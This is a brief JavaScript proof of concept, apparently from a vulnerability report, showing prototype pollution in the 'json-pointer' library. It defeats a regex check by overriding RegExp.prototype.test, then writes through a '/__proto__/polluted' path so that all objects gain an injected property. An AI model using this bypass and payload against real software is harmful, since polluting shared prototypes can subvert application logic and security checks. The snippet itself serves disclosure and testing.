RegExp.prototype.test = () => false;
const pointer = require('json-pointer');
let obj = {};
console.log({}.polluted);
pointer.set(obj, '/__proto__/polluted', 'yes');
console.log({}.polluted);